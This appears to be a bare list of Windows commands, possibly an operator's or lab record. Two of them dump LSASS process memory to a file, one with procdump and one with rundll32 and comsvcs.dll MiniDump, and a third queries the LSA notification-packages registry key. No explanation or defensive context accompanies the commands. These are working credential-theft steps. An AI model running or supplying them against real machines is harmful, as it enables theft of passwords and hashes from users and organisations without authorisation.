Start-Transcript record_transcript.txt

procdump.exe -accepteula -ma lsass.exe lsass.dmp

cd C:\Windows\System32
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full

reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"